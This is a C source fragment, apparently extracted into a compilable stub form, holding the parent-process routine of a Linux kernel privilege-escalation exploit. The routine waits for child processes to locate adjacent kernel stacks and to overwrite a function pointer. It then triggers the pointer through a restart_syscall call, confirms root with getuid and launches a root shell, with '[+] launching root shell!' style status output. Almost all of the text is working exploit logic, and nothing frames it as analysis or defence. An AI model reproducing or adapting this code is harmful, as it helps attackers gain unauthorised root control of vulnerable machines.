#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {scalar_t__* addrs; scalar_t__ parent; } ;

/* Variables and functions */
 scalar_t__ KSTACK_CLOBBER ; 
 scalar_t__ KSTACK_DIE ; 
 scalar_t__ KSTACK_LOWER ; 
 scalar_t__ KSTACK_SIZE ; 
 scalar_t__ KSTACK_UNINIT ; 
 scalar_t__ KSTACK_UPPER ; 
 int NPROC ; 
 int /*<<< orphan*/  __NR_restart_syscall ; 
 int /*<<< orphan*/  execl (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 scalar_t__ getuid () ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 TYPE_1__* region ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  syscall (int /*<<< orphan*/ ) ; 

void
do_parent(void)
{
	int i, j, upper, lower;

	/* parent sleeps until we've discovered all the child kstacks */
	while (1) {
		sleep(1);
		for (i = 0; i < NPROC; ++i) {
			if (region->addrs[i] == KSTACK_UNINIT) {
				break;
			}
		}
		if (i == NPROC) {
			break;
		}
	}

	/* figure out if we have any adjacent child kstacks */
	for (i = 0; i < NPROC; ++i) {
		for (j = 0; j < NPROC; ++j) {
			if (region->addrs[i] == region->addrs[j] + KSTACK_SIZE) {
				break;
			}
		}
		if (j != NPROC) {
			break;
		}
	}
	if (i == NPROC && j == NPROC) {
		printf("[-] failed to find adjacent kstacks, try again!\n");
		exit(1);
	}

	upper = i;
	lower = j;

	printf("[+] found adjacent children kstacks at 0x%lx and 0x%lx\n", region->addrs[lower], region->addrs[upper]);

	/* signal to non-adjacent children to die */
	for (i = 0; i < NPROC; ++i) {
		if (i != upper && i != lower) {
			region->addrs[i] = KSTACK_DIE;
		}
	}

	/* signal adjacent children to continue on */
	region->addrs[upper] = KSTACK_UPPER;
	region->addrs[lower] = KSTACK_LOWER;

	/* parent sleeps until child has clobbered the fptr */
	while (1) {
		sleep(1);
		if (region->parent == KSTACK_CLOBBER) {
			break;
		}
	}

	printf("[+] escalating privileges...\n");

	/* trigger our clobbered fptr */
	syscall(__NR_restart_syscall);

	/* our privileges should be escalated now */
	if (getuid() != 0) {
		printf("[-] privilege escalation failed, aborting!\n");
		exit(1);
	}

	printf("[+] launching root shell!\n");

	execl("/bin/sh", "/bin/sh", NULL);
}